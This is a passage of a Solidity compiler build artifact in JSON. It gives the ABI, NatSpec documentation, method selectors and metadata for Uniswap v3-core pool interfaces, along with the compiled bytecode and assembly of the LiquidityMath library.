							"type": "function"
						},
						{
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"maxLiquidityPerTick()": {
								"details": "This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool",
								"returns": {
									"_0": "The max amount of liquidity per tick"
								}
							},
							"tickSpacing()": {
								"details": "Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.",
								"returns": {
									"_0": "The tick spacing"
								}
							}
						},
						"title": "Pool state that never changes"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"factory()": "c45a0155",
							"fee()": "ddca3f43",
							"maxLiquidityPerTick()": "70cf754a",
							"tickSpacing()": "d0c93a7c",
							"token0()": "0dfe1681",
							"token1()": "d21220a7"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fee\",\"outputs\":[{\"internalType\":\"uint24\",\"name\":\"\",\"type\":\"uint24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidityPerTick\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tickSpacing\",\"outputs\":[{\"internalType\":\"int24\",\"name\":\"\",\"type\":\"int24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"maxLiquidityPerTick()\":{\"details\":\"This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\",\"returns\":{\"_0\":\"The max amount of liquidity per tick\"}},\"tickSpacing()\":{\"details\":\"Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.\",\"returns\":{\"_0\":\"The tick spacing\"}}},\"title\":\"Pool state that never changes\"},\"userdoc\":{\"methods\":{\"factory()\":{\"notice\":\"The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\"},\"fee()\":{\"notice\":\"The pool's fee in hundredths of a bip, i.e. 1e-6\"},\"maxLiquidityPerTick()\":{\"notice\":\"The maximum amount of position liquidity that can use any tick in the range\"},\"tickSpacing()\":{\"notice\":\"The pool tick spacing\"},\"token0()\":{\"notice\":\"The first of the two tokens of the pool, sorted by address\"},\"token1()\":{\"notice\":\"The second of the two tokens of the pool, sorted by address\"}},\"notice\":\"These parameters are fixed for a pool forever, i.e., the methods will always return the same values\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":\"IUniswapV3PoolImmutables\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":{\"keccak256\":\"0xf6e5d2cd1139c4c276bdbc8e1d2b256e456c866a91f1b868da265c6d2685c3f7\",\"urls\":[\"bzz-raw://b99c8c9ae8e27ee6559e5866bea82cbc9ffc8247f8d15b7422a4deb287d4d047\",\"dweb:/ipfs/QmfL8gaqt3ffAnm6nVj5ksuNpLygXuL3xq5VBqrkwC2JJ3\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"factory()": {
								"notice": "The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface"
							},
							"fee()": {
								"notice": "The pool's fee in hundredths of a bip, i.e. 1e-6"
							},
							"maxLiquidityPerTick()": {
								"notice": "The maximum amount of position liquidity that can use any tick in the range"
							},
							"tickSpacing()": {
								"notice": "The pool tick spacing"
							},
							"token0()": {
								"notice": "The first of the two tokens of the pool, sorted by address"
							},
							"token1()": {
								"notice": "The second of the two tokens of the pool, sorted by address"
							}
						},
						"notice": "These parameters are fixed for a pool forever, i.e., the methods will always return the same values"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol": {
				"IUniswapV3PoolOwnerActions": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collectProtocol",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint8",
									"name": "feeProtocol0",
									"type": "uint8"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol1",
									"type": "uint8"
								}
							],
							"name": "setFeeProtocol",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"collectProtocol(address,uint128,uint128)": {
								"params": {
									"amount0Requested": "The maximum amount of token0 to send, can be 0 to collect fees in only token1",
									"amount1Requested": "The maximum amount of token1 to send, can be 0 to collect fees in only token0",
									"recipient": "The address to which collected protocol fees should be sent"
								},
								"returns": {
									"amount0": "The protocol fee collected in token0",
									"amount1": "The protocol fee collected in token1"
								}
							},
							"setFeeProtocol(uint8,uint8)": {
								"params": {
									"feeProtocol0": "new protocol fee for token0 of the pool",
									"feeProtocol1": "new protocol fee for token1 of the pool"
								}
							}
						},
						"title": "Permissioned pool actions"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"collectProtocol(address,uint128,uint128)": "85b66729",
							"setFeeProtocol(uint8,uint8)": "8206a4d1"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collectProtocol\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"feeProtocol0\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol1\",\"type\":\"uint8\"}],\"name\":\"setFeeProtocol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"collectProtocol(address,uint128,uint128)\":{\"params\":{\"amount0Requested\":\"The maximum amount of token0 to send, can be 0 to collect fees in only token1\",\"amount1Requested\":\"The maximum amount of token1 to send, can be 0 to collect fees in only token0\",\"recipient\":\"The address to which collected protocol fees should be sent\"},\"returns\":{\"amount0\":\"The protocol fee collected in token0\",\"amount1\":\"The protocol fee collected in token1\"}},\"setFeeProtocol(uint8,uint8)\":{\"params\":{\"feeProtocol0\":\"new protocol fee for token0 of the pool\",\"feeProtocol1\":\"new protocol fee for token1 of the pool\"}}},\"title\":\"Permissioned pool actions\"},\"userdoc\":{\"methods\":{\"collectProtocol(address,uint128,uint128)\":{\"notice\":\"Collect the protocol fee accrued to the pool\"},\"setFeeProtocol(uint8,uint8)\":{\"notice\":\"Set the denominator of the protocol's % share of the fees\"}},\"notice\":\"Contains pool methods that may only be called by the factory owner\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":\"IUniswapV3PoolOwnerActions\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":{\"keccak256\":\"0x759b78a2918af9e99e246dc3af084f654e48ef32bb4e4cb8a966aa3dcaece235\",\"urls\":[\"bzz-raw://64144fb96e1c7fdba87305acadb98a198d26a3d46c097cb3a666e567f6f29735\",\"dweb:/ipfs/QmUnWVwN9FKB9uV5Pr8YfLpWZnYM2DENnRMaadZ492JS9u\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"collectProtocol(address,uint128,uint128)": {
								"notice": "Collect the protocol fee accrued to the pool"
							},
							"setFeeProtocol(uint8,uint8)": {
								"notice": "Set the denominator of the protocol's % share of the fees"
							}
						},
						"notice": "Contains pool methods that may only be called by the factory owner"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol": {
				"IUniswapV3PoolState": {
					"abi": [
						{
							"inputs": [],
							"name": "feeGrowthGlobal0X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "feeGrowthGlobal1X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "liquidity",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "index",
									"type": "uint256"
								}
							],
							"name": "observations",
							"outputs": [
								{
									"internalType": "uint32",
									"name": "blockTimestamp",
									"type": "uint32"
								},
								{
									"internalType": "int56",
									"name": "tickCumulative",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityCumulativeX128",
									"type": "uint160"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "key",
									"type": "bytes32"
								}
							],
							"name": "positions",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "_liquidity",
									"type": "uint128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside0LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside1LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "protocolFees",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "token0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "token1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "slot0",
							"outputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								},
								{
									"internalType": "uint16",
									"name": "observationIndex",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinality",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol",
									"type": "uint8"
								},
								{
									"internalType": "bool",
									"name": "unlocked",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int16",
									"name": "wordPosition",
									"type": "int16"
								}
							],
							"name": "tickBitmap",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "ticks",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "liquidityGross",
									"type": "uint128"
								},
								{
									"internalType": "int128",
									"name": "liquidityNet",
									"type": "int128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside0X128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside1X128",
									"type": "uint256"
								},
								{
									"internalType": "int56",
									"name": "tickCumulativeOutside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityOutsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsOutside",
									"type": "uint32"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"feeGrowthGlobal0X128()": {
								"details": "This value can overflow the uint256"
							},
							"feeGrowthGlobal1X128()": {
								"details": "This value can overflow the uint256"
							},
							"liquidity()": {
								"details": "This value has no relationship to the total liquidity across all ticks"
							},
							"observations(uint256)": {
								"details": "You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.",
								"params": {
									"index": "The element of the observations array to fetch"
								},
								"returns": {
									"blockTimestamp": "The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use"
								}
							},
							"positions(bytes32)": {
								"params": {
									"key": "The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper"
								},
								"returns": {
									"_liquidity": "The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke"
								}
							},
							"protocolFees()": {
								"details": "Protocol fees will never exceed uint128 max in either token"
							},
							"ticks(int24)": {
								"params": {
									"tick": "The tick to look up"
								},
								"returns": {
									"liquidityGross": "the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position."
								}
							}
						},
						"title": "Pool state that can change"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"feeGrowthGlobal0X128()": "f3058399",
							"feeGrowthGlobal1X128()": "46141319",
							"liquidity()": "1a686502",
							"observations(uint256)": "252c09d7",
							"positions(bytes32)": "514ea4bf",
							"protocolFees()": "1ad8b03b",
							"slot0()": "3850c7bd",
							"tickBitmap(int16)": "5339c296",
							"ticks(int24)": "f30dba93"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"feeGrowthGlobal0X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeGrowthGlobal1X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidity\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"observations\",\"outputs\":[{\"internalType\":\"uint32\",\"name\":\"blockTimestamp\",\"type\":\"uint32\"},{\"internalType\":\"int56\",\"name\":\"tickCumulative\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityCumulativeX128\",\"type\":\"uint160\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"key\",\"type\":\"bytes32\"}],\"name\":\"positions\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"_liquidity\",\"type\":\"uint128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside0LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside1LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"protocolFees\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"token0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"token1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"slot0\",\"outputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"},{\"internalType\":\"uint16\",\"name\":\"observationIndex\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinality\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol\",\"type\":\"uint8\"},{\"internalType\":\"bool\",\"name\":\"unlocked\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int16\",\"name\":\"wordPosition\",\"type\":\"int16\"}],\"name\":\"tickBitmap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"ticks\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"liquidityGross\",\"type\":\"uint128\"},{\"internalType\":\"int128\",\"name\":\"liquidityNet\",\"type\":\"int128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside0X128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside1X128\",\"type\":\"uint256\"},{\"internalType\":\"int56\",\"name\":\"tickCumulativeOutside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityOutsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsOutside\",\"type\":\"uint32\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"feeGrowthGlobal0X128()\":{\"details\":\"This value can overflow the uint256\"},\"feeGrowthGlobal1X128()\":{\"details\":\"This value can overflow the uint256\"},\"liquidity()\":{\"details\":\"This value has no relationship to the total liquidity across all ticks\"},\"observations(uint256)\":{\"details\":\"You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.\",\"params\":{\"index\":\"The element of the observations array to fetch\"},\"returns\":{\"blockTimestamp\":\"The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use\"}},\"positions(bytes32)\":{\"params\":{\"key\":\"The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\"},\"returns\":{\"_liquidity\":\"The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\"}},\"protocolFees()\":{\"details\":\"Protocol fees will never exceed uint128 max in either token\"},\"ticks(int24)\":{\"params\":{\"tick\":\"The tick to look up\"},\"returns\":{\"liquidityGross\":\"the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position.\"}}},\"title\":\"Pool state that can change\"},\"userdoc\":{\"methods\":{\"feeGrowthGlobal0X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\"},\"feeGrowthGlobal1X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\"},\"liquidity()\":{\"notice\":\"The currently in range liquidity available to the pool\"},\"observations(uint256)\":{\"notice\":\"Returns data about a specific observation index\"},\"positions(bytes32)\":{\"notice\":\"Returns the information about a position by the position's key\"},\"protocolFees()\":{\"notice\":\"The amounts of token0 and token1 that are owed to the protocol\"},\"slot0()\":{\"notice\":\"The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally.\"},\"tickBitmap(int16)\":{\"notice\":\"Returns 256 packed tick initialized boolean values. See TickBitmap for more information\"},\"ticks(int24)\":{\"notice\":\"Look up information about a specific tick in the pool\"}},\"notice\":\"These methods compose the pool's state, and can change with any frequency including multiple times per transaction\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":\"IUniswapV3PoolState\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":{\"keccak256\":\"0x852dc1f5df7dcf7f11e7bb3eed79f0cea72ad4b25f6a9d2c35aafb48925fd49f\",\"urls\":[\"bzz-raw://ed63907c38ff36b0e22bc9ffc53e791ea74f0d4f0e7c257fdfb5aaf8825b1f0f\",\"dweb:/ipfs/QmSQrckghEjs6HVsA5GVgpNpZWvTXMY5eQLF7cN6deFeEg\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"feeGrowthGlobal0X128()": {
								"notice": "The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool"
							},
							"feeGrowthGlobal1X128()": {
								"notice": "The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool"
							},
							"liquidity()": {
								"notice": "The currently in range liquidity available to the pool"
							},
							"observations(uint256)": {
								"notice": "Returns data about a specific observation index"
							},
							"positions(bytes32)": {
								"notice": "Returns the information about a position by the position's key"
							},
							"protocolFees()": {
								"notice": "The amounts of token0 and token1 that are owed to the protocol"
							},
							"slot0()": {
								"notice": "The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally."
							},
							"tickBitmap(int16)": {
								"notice": "Returns 256 packed tick initialized boolean values. See TickBitmap for more information"
							},
							"ticks(int24)": {
								"notice": "Look up information about a specific tick in the pool"
							}
						},
						"notice": "These methods compose the pool's state, and can change with any frequency including multiple times per transaction"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol": {
				"LiquidityMath": {
					"abi": [],
					"devdoc": {
						"methods": {},
						"title": "Math library for liquidity"
					},
					"evm": {
						"assembly": "    /* \"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":109:621  library LiquidityMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":109:621  library LiquidityMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n\n    auxdata: 0xa264697066735822122095155d5045ec6a7d67edad656ead3f8acebdb7abcd5f0a41d4db7f969b61edda64736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122095155d5045ec6a7d67edad656ead3f8acebdb7abcd5f0a41d4db7f969b61edda64736f6c63430006060033",
							"opcodes": "PUSH1 0x56 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP6 ISZERO 0x5D POP GASLIMIT 0xEC PUSH11 0x7D67EDAD656EAD3F8ACEBD 0xB7 0xAB 0xCD 0x5F EXP COINBASE 0xD4 0xDB PUSH32 0x969B61EDDA64736F6C6343000606003300000000000000000000000000000000 ",
